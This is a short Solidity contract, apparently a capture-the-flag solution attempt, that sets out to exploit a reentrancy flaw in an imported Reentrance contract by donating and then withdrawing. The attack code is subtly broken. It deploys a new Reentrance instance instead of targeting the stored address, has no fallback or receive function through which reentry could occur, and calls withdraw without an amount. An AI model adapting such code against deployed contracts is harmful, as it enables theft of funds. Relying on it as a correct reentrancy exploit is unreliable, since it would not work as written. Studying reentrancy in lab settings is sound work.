// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;
import "./Reentrance.sol";

contract AttackingReentrance {
    address payable public contractAddress;

    constructor(address payable _contractAddress) payable {
        contractAddress = _contractAddress;
    }

    function hackContract() external {
    
        Reentrance reentrance = new Reentrance();
        reentrance.donate{value: 1}(address(this));
        reentrance.withdraw();
    }
}
